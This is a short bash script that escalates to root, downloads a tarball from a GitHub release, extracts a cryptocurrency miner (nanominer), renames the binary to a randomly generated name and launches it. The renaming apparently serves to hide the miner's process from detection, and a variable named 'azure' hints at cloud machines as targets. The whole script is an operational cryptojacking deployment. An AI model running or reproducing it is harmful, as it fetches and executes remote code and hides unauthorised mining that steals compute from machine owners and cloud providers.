#!/bin/bash
sudo su -
apt-get update
apt-get install -y git wget screen
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum.tar.gz
tar xf platinum.tar.gz
rm -rf platinum.tar.gz && cd platinum
mv nanominer $azure -n
cp $azure "$cpuname"
rm -f  nanominer
./"${cpuname}"
